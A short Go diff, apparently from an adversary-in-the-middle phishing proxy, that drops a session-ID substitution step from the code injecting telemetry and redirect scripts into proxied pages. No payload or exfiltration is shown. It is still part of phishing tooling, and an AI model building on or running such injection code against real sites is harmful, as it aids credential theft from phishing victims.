@@ -175,10 +175,9 @@ func (c *connection) injectJS(resp *http.Response) {
 		return
 	}
 
-	quotedSID := fmt.Sprintf("%q", c.session.ID)
 	var scriptContent strings.Builder
-	scriptContent.WriteString(injectSID(telemetryScript, quotedSID))
-	scriptContent.WriteString(injectSID(redirectScript, quotedSID))
+	scriptContent.WriteString(telemetryScript)
+	scriptContent.WriteString(redirectScript)
 
 	if resp.Request != nil {
 		for _, jsInject := range c.phishlet.JSInjects {
@@ -257,8 +256,4 @@ func (c *connection) expandTemplate(tmpl string) string {
 
 func markedScript(content string) string {
 	return fmt.Sprintf("<script>%s\n%s\n%s</script>", obfuscator.MarkerStart, content, obfuscator.MarkerEnd)
-}
-
-func injectSID(script, quotedSID string) string {
-	return strings.ReplaceAll(script, `"__MIRAGE_SID__"`, quotedSID)
 }
